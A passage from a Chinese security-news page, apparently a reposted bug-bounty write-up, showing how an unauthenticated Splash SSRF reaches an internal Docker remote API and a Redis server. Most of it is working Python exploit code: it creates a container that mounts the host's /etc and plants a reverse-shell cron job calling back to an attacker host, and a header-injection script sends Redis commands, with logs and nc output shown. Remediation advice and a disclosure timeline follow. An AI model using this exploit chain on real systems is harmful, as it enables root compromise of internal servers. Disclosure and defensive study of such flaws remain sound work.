def&nbsp;create_container(api,&nbsp;docker_api,&nbsp;image_name,&nbsp;image_tag,&nbsp;shell_host,&nbsp;shell_port):
&nbsp;&nbsp;&nbsp;&nbsp;image&nbsp;=&nbsp;&quot;%s:%s&quot;&nbsp;%&nbsp;(image_name,&nbsp;image_tag)
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;create_container:&nbsp;%s&quot;&nbsp;%&nbsp;image)
&nbsp;&nbsp;&nbsp;&nbsp;body&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Image&quot;:&nbsp;image,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Volumes&quot;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;/etc&quot;:&nbsp;{&nbsp;&nbsp;#&nbsp;挂载根目录有时候会出错，这里选择挂载/etc
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;bind&quot;:&nbsp;&quot;/hostdir&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;mode&quot;:&nbsp;&quot;rw&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;HostConfig&quot;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Binds&quot;:&nbsp;[&quot;/etc:/hostdir&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Cmd&quot;:&nbsp;[&nbsp;&nbsp;#&nbsp;运行&nbsp;start.sh，将反弹定时任务写入宿主机/etc/crontab
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;/bin/sh&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;/start.sh&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell_host,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str(shell_port),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;%s/render.html&quot;&nbsp;%&nbsp;api
&nbsp;&nbsp;&nbsp;&nbsp;docker_url&nbsp;=&nbsp;&#39;%s/containers/create&#39;&nbsp;%&nbsp;docker_api
&nbsp;&nbsp;&nbsp;&nbsp;params&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;http_method&#39;:&nbsp;&#39;POST&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;url&#39;:&nbsp;docker_url,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;timeout&#39;:&nbsp;60
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;resp&nbsp;=&nbsp;requests.post(url,&nbsp;params=params,&nbsp;json={
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;headers&#39;:&nbsp;{&#39;Content-Type&#39;:&nbsp;&#39;application/json&#39;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;body&quot;:&nbsp;json.dumps(body)
&nbsp;&nbsp;&nbsp;&nbsp;})
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.request.url)
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.status_code)
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.text)
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;re.search(&#39;&quot;Id&quot;:&quot;(\w+)&quot;&#39;,&nbsp;resp.text)
&nbsp;&nbsp;&nbsp;&nbsp;container_id&nbsp;=&nbsp;result.group(1)
&nbsp;&nbsp;&nbsp;&nbsp;print(container_id)
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;-&quot;&nbsp;*&nbsp;50)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;container_id
def&nbsp;start_container(api,&nbsp;docker_api,&nbsp;container_id):
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;%s/render.html&quot;&nbsp;%&nbsp;api
&nbsp;&nbsp;&nbsp;&nbsp;docker_url&nbsp;=&nbsp;&#39;%s/containers/%s/start&#39;&nbsp;%&nbsp;(docker_api,&nbsp;container_id)
&nbsp;&nbsp;&nbsp;&nbsp;params&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;http_method&#39;:&nbsp;&#39;POST&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;url&#39;:&nbsp;docker_url,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;timeout&#39;:&nbsp;10
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;resp&nbsp;=&nbsp;requests.post(url,&nbsp;params=params,&nbsp;json={
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;headers&#39;:&nbsp;{&#39;Content-Type&#39;:&nbsp;&#39;application/json&#39;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;body&quot;:&nbsp;&quot;&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;})
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.request.url)
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.status_code)
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.text)
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;-&quot;&nbsp;*&nbsp;50)
def&nbsp;get_result(api,&nbsp;docker_api,&nbsp;container_id):
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;%s/render.html&quot;&nbsp;%&nbsp;api
&nbsp;&nbsp;&nbsp;&nbsp;docker_url&nbsp;=&nbsp;&#39;%s/containers/%s/json&#39;&nbsp;%&nbsp;(docker_api,&nbsp;container_id)
&nbsp;&nbsp;&nbsp;&nbsp;params&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;url&#39;:&nbsp;docker_url
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;resp&nbsp;=&nbsp;requests.get(url,&nbsp;params=params,&nbsp;json={
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;headers&#39;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Accept&#39;:&nbsp;&#39;application/json&#39;},
&nbsp;&nbsp;&nbsp;&nbsp;})
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.request.url)
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.status_code)
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;re.search(&#39;&quot;ExitCode&quot;:(\w+),&quot;&#39;,&nbsp;resp.text)
&nbsp;&nbsp;&nbsp;&nbsp;exit_code&nbsp;=&nbsp;result.group(1)
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;exit_code&nbsp;==&nbsp;&#39;0&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;success&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;error&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;-&quot;&nbsp;*&nbsp;50)
if&nbsp;__name__&nbsp;==&nbsp;&#39;__main__&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;splash地址和端口
&nbsp;&nbsp;&nbsp;&nbsp;splash_host&nbsp;=&nbsp;&#39;192.168.1.120&#39;
&nbsp;&nbsp;&nbsp;&nbsp;splash_port&nbsp;=&nbsp;8050
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;内网docker的地址和端口
&nbsp;&nbsp;&nbsp;&nbsp;docker_host&nbsp;=&nbsp;&#39;172.16.10.74&#39;
&nbsp;&nbsp;&nbsp;&nbsp;docker_port&nbsp;=&nbsp;2375
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;反弹shell的地址和端口
&nbsp;&nbsp;&nbsp;&nbsp;shell_host&nbsp;=&nbsp;&#39;192.168.1.213&#39;
&nbsp;&nbsp;&nbsp;&nbsp;shell_port&nbsp;=&nbsp;12345
&nbsp;&nbsp;&nbsp;&nbsp;splash_api&nbsp;=&nbsp;&quot;http://%s:%d&quot;&nbsp;%&nbsp;(splash_host,&nbsp;splash_port)
&nbsp;&nbsp;&nbsp;&nbsp;docker_api&nbsp;=&nbsp;&#39;http://%s:%d&#39;&nbsp;%&nbsp;(docker_host,&nbsp;docker_port)
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;docker&nbsp;image，存在docker&nbsp;hub上
&nbsp;&nbsp;&nbsp;&nbsp;image_name&nbsp;=&nbsp;&#39;b1ngz/busybox&#39;
&nbsp;&nbsp;&nbsp;&nbsp;image_tag&nbsp;=&nbsp;&#39;latest&#39;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;拉取&nbsp;image
&nbsp;&nbsp;&nbsp;&nbsp;pull_image(splash_api,&nbsp;docker_api,&nbsp;image_name,&nbsp;image_tag)
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;创建&nbsp;container
&nbsp;&nbsp;&nbsp;&nbsp;container_id&nbsp;=&nbsp;create_container(splash_api,&nbsp;docker_api,&nbsp;image_name,&nbsp;image_tag,&nbsp;shell_host,&nbsp;shell_port)
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;启动&nbsp;container
&nbsp;&nbsp;&nbsp;&nbsp;start_container(splash_api,&nbsp;docker_api,&nbsp;container_id)
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;获取写入crontab结果
&nbsp;&nbsp;&nbsp;&nbsp;get_result(splash_api,&nbsp;docker_api,&nbsp;container_id)</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); text-indent: 2em;">其他利用思路</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其他思路的话，首先想到 ssrf 配合 gopher 协议，然后结合内网 redis，因为splash是基于qt的， 查了一下文档 ，qtwebkit 默认不支持 gopher 协议，所以无法使用 gopher 。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">后来经过测试，发现请求 headers 可控 ，并且支持 \n 换行</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里测试选择了 redis 3.2.8 版本，以root权限运行，监听在 172.16.10.74，测试脚本如下，可以成功执行</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;-*-&nbsp;coding:&nbsp;utf-8&nbsp;-*-
__author__&nbsp;=&nbsp;&#39;b1ng&#39;
import&nbsp;requests
def&nbsp;test_get(api,&nbsp;redis_api):
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;%s/render.html&quot;&nbsp;%&nbsp;api
&nbsp;&nbsp;&nbsp;&nbsp;params&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;url&#39;:&nbsp;redis_api,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;timeout&#39;:&nbsp;10
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;resp&nbsp;=&nbsp;requests.post(url,&nbsp;params=params,&nbsp;json={
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;headers&#39;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;config&nbsp;set&nbsp;dir&nbsp;/root\n&#39;:&nbsp;&#39;&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},
&nbsp;&nbsp;&nbsp;&nbsp;})
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.request.url)
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.status_code)
&nbsp;&nbsp;&nbsp;&nbsp;print(resp.text)
if&nbsp;__name__&nbsp;==&nbsp;&#39;__main__&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;splash地址和端口
&nbsp;&nbsp;&nbsp;&nbsp;splash_host&nbsp;=&nbsp;&#39;192.168.1.120&#39;
&nbsp;&nbsp;&nbsp;&nbsp;splash_port&nbsp;=&nbsp;8050
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;内网docker的地址和端口
&nbsp;&nbsp;&nbsp;&nbsp;docker_host&nbsp;=&nbsp;&#39;172.16.10.74&#39;
&nbsp;&nbsp;&nbsp;&nbsp;docker_port&nbsp;=&nbsp;6379
&nbsp;&nbsp;&nbsp;&nbsp;splash_api&nbsp;=&nbsp;&quot;http://%s:%d&quot;&nbsp;%&nbsp;(splash_host,&nbsp;splash_port)
&nbsp;&nbsp;&nbsp;&nbsp;docker_api&nbsp;=&nbsp;&#39;http://%s:%d&#39;&nbsp;%&nbsp;(docker_host,&nbsp;docker_port)
&nbsp;&nbsp;&nbsp;&nbsp;test_get(splash_api,&nbsp;docker_api)</pre><p style="text-indent: 2em;"><br/></p><pre class="brush:plain;toolbar:false">运行后&nbsp;redis&nbsp;发出了警告&nbsp;(高版本的新功能)
24089:M&nbsp;11&nbsp;Jul&nbsp;23:29:07.730&nbsp;-&nbsp;Accepted&nbsp;172.17.0.2:56886
24089:M&nbsp;11&nbsp;Jul&nbsp;23:29:07.730&nbsp;#&nbsp;Possible&nbsp;SECURITY&nbsp;ATTACK&nbsp;detected.&nbsp;It&nbsp;looks&nbsp;like&nbsp;somebody&nbsp;is&nbsp;sending&nbsp;POST&nbsp;or&nbsp;Host:&nbsp;commands&nbsp;to&nbsp;Redis.&nbsp;This&nbsp;is&nbsp;likely&nbsp;due&nbsp;to&nbsp;an&nbsp;attacker&nbsp;attempting&nbsp;to&nbsp;use&nbsp;Cross&nbsp;Protocol&nbsp;Scripting&nbsp;to&nbsp;compromise&nbsp;your&nbsp;Redis&nbsp;instance.&nbsp;Connection&nbsp;aborted.</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">但是执行了</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">172.16.10.74:6379&gt;&nbsp;config&nbsp;get&nbsp;dir
1)&nbsp;&quot;dir&quot;
2)&nbsp;&quot;/root&quot;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">后来又测试了一下 post body，发现 body 还没发出去，连接就被强制断开了，所以无法利用</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里用 nc 来看一下发送的数据包</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">root@test:/home/user/Desktop#&nbsp;nc&nbsp;-vv&nbsp;-l&nbsp;-p&nbsp;5555
Listening&nbsp;on&nbsp;[0.0.0.0]&nbsp;(family&nbsp;0,&nbsp;port&nbsp;5555)
Connection&nbsp;from&nbsp;[172.17.0.2]&nbsp;port&nbsp;5555&nbsp;[tcp/*]&nbsp;accepted&nbsp;(family&nbsp;2,&nbsp;sport&nbsp;38384)
GET&nbsp;/&nbsp;HTTP/1.1
config&nbsp;set&nbsp;dir&nbsp;/root
:
Accept:&nbsp;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent:&nbsp;Mozilla/5.0&nbsp;(X11;&nbsp;Linux&nbsp;x86_64)&nbsp;AppleWebKit/538.1&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;splash&nbsp;Safari/538.1
Connection:&nbsp;Keep-Alive
Accept-Encoding:&nbsp;gzip,&nbsp;deflate
Accept-Language:&nbsp;en,*
Host:&nbsp;172.16.10.74:5555</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到 &nbsp;config set dir /root，说明可以利用</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其他的话，因为支持post，也可以结合一些内网系统进行利用，这里就不细说了</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x 04 修复方案</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">对于splash，看了下文档，没有提到认证说明，应该是应用本身就没有这个功能，所以得自己加认证，临时方案可以用 basic 认证，彻底修复的话还是得自己修改代码，加上认证功能</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里的 docker remote api，应该是因为旧版本的 swarm 开放的，根据 文档 中 step 3，每个 node 都会开放 2375 或者 2376 端口，通过 iptables 来限制的话，需要配置 client node 的端口只允许 manager 访问，manager 的端口需要加白名单</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x 05 Timeline</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2017-07-05 02:00:00 &nbsp;提交漏洞，报告内容为存在带回显 SSRF</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017-07-05 10:07:28 &nbsp;深入后成功获取内网服务器root权限 (可获取多台服务器root权限，并可拉取和push docker仓库image，仓库中有如 api-xxx、xxx.com 名称的 image )，联系审核人员，提交补充后的报告</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017-07-06 18:15:00 &nbsp;联系审核人员，询问进度，告知已复现。因为之前相同危害漏洞评级为严重，所以询问此漏洞是否属于严重漏洞，告知金币兑换比例提升后( 5:1 提升为 1:1 )，严重漏洞评定收紧，明天审核</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017-07-07 14:31:00 &nbsp;审核人员告知复现时，获取内网权限步骤遇到问题，要求提供更多细节，因为之前笔记笔记乱，回复晚些整理后再发送，顺带询问评级，答复获取到权限的服务器不属于核心服务器，并且内部对评为 一般业务高危 还是 一般业务严重 存在分歧，对应金币奖励为 800 和 1000，正好赶上三倍活动，也就是 2400 - 3000。这里算了一下，按照奖励提升之前的评级规则，相同危害的漏洞是评为核心严重的，对应奖励为 5000现金 + 3000 积分 (兑换比例5:1)，这里相同危害，奖励提升后，再加上三倍金币活动，比之前的奖励还低一些，所以觉得不合理，因赶上周五和其他一些事情，商量下周一给评级</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017-07-10 10:16:00 联系审核人员，因为两边对于评级意见不一致，询问是否能够给予授权，继续深入，尝试证明可获取到 “核心服务器” 权限，回复没有给予授权，并告知可以判定为非核心严重级别，询问是否能够接受，回复不能接受，并给出理由</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017-07-12 10:08:00 联系审核人员，提供获取反弹shell &nbsp;EXP，并告知会写文章，希望尽快确认并修复，最终给予评级 严重非核心 ，1500 积分，4500 金币(三倍活动)</span></p><p><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 b1ngz@先知安全技术社区<br/><a class="text-more" href="https://xianzhi.aliyun.com/forum/read/1872.html" target="_blank">原文链接：https://xianzhi.aliyun.com/forum/read/1872.html</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】Splash SSRF到获取内网服务器ROOT权限 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="4113" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/11x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="15406" user-name="浅花迷人_" href="javascript:;">
                浅花迷人_            </a>
                        <span class="comment-time">2017-07-17 22:31:21</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15406">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15406" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">看着都觉得胃疼</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4113" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
